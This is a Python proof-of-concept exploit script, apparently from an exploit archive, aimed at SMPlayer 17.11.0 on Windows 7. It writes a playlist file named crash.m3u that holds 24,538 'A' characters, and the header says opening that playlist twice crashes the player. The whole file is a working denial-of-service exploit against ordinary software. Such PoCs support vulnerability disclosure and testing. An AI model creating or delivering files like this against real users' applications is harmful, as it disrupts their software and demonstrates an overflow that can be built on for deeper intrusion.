#!/usr/bin/python
 
#
# Exploit Author: bzyo
# Twitter: @bzyo_
# Exploit Title: SMPlayer 17.11.0 - '.m3u' Crash (PoC)
# Date: 05-11-2017
# Vulnerable Software: SMPlayer v17.11.0
# Vendor Homepage: http://www.smplayer.info
# Version: v17.11.0
# Software Link: http://www.smplayer.info/en/downloads
# Tested On: Windows 7 x64
#
#
# PoC: generate crash.m3u, open playlist twice in app
#
#

file="crash.m3u"

crash = "A"*24538  		#crashes on 24538, but more will do
 
writeFile = open (file, "w")
writeFile.write( crash )
writeFile.close()